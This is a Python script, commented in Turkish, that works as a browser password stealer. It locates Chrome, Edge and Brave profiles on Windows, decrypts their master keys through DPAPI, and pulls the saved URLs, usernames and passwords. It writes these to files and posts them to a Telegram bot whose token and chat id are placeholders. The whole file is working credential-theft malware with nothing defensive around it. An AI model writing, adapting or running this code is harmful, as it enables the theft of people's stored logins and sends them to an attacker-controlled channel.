import os
import json
import base64
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil
import requests

# Os modülü Python'da hazır olarak gelen , dosya ve dizinlerde kolaylıkla işlemler yapmamızı sağlayan bir modüldür.
# Burda farklı işletim sistemleri için dosya dizinlerine ulaşılıyor.
appdata = os.getenv('LOCALAPPDATA')


# Burda belirlenen dosya dizini boş döndüğü durumda hata dönemsi engeleniyor.
def getenv():
    if appdata is not None:
        return appdata
    else:
        return ''


# Burda birden fazla tarayıcı sistem yolları belirleniyor.
browsers = {
    'google-chrome-sxs': getenv() + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': getenv() + '\\Google\\Chrome\\User Data',
    'microsoft-edge': getenv() + '\\Microsoft\\Edge\\User Data',
    'brave': getenv() + '\\BraveSoftware\\Brave-Browser\\User Data',
}


# Burda seçilen path ten gelen datalar okunuyor ve data içerisindeki şifreler encrypt ediliyor.
def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


# Burda bir önceki fonksiyonda(get_master_key) encrypt edilmiş dataları decrypt ediliyor.
def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


# Burda çekilen verileri bir txt dosyasına kaydediliyor ve ardından açtığım telegrem botuna, çekilen veriler gönderiliyor.
def save_results(browser_name, data_type, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content is not None:
        open(f'{browser_name}/{data_type}.txt',
             'w', encoding='utf-8').write(content)
        requests.post(url="https://api.telegram.org/botYourId:Here/sendMessage",
                      data={"chat_id": "YourChatId", "text": content}).json()
    else:
        print(f"\t [-] No Data Found!")


# Burda tarayıcıdan gelen verileri sqlite3(Veritabanı Çözümü) modülü kullanılarak sınıflandırılıyor.
def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, 'login_db')
    conn = sqlite3.connect('login_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    os.remove('login_db')
    return result


# Burda tarayıcı verileri indiriliyor.
def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results


# Burda kullanıcının bilgisayarında bulunan tarayıcılardan verileri alarak verilerin kaydedildiği bir dosya hazırlanıyor
# ve bu verileri telegram hesabımda oluşturduğum bota mesaj olarak atıyorum.
if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        print("\t [!] Getting Saved Passwords")
        save_results(browser, 'Saved_Passwords', get_login_data(
            browser_path, "Default", master_key))
        print("\t------\n")
